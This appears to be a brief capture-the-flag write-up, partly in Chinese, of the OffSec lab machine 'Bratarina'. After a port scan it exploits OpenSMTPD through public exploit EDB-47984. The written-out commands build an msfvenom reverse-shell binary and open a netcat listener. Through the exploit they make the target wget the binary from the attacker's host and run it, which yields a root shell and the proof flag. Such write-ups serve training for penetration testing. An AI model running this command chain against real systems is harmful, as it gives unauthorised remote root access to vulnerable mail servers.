###### tags: `Offsec` `PG Practice` `Easy` `Linux`

# Bratarina
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.162.71 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.162.71:22
Open 192.168.162.71:25
Open 192.168.162.71:80
Open 192.168.162.71:445

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp        syn-ack OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.228], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
25/tcp  open  smtp        syn-ack OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.228], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
80/tcp  open  http        syn-ack nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB        
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

google找到[edb-47984](https://www.exploit-db.com/exploits/47984)，因只有開445，一定要用445port才能reverse(或是80，這台開這兩個)
```
┌──(kali㉿kali)-[~/pgplay]
└─$ searchsploit -m 47984

┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.209 LPORT=445 -f elf > shell_445

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp445

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 47984.py 192.168.237.71 25 "wget 192.168.45.209/shell_445"

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 47984.py 192.168.237.71 25 "chmod +x shell_445"

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 47984.py 192.168.237.71 25 "./shell_445"
```

等反彈就發現直接是root，在/root找到proof.txt
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@bratarina:/root# cat proof.txt
92cef15a90a2c3a36b27408624eadb44
```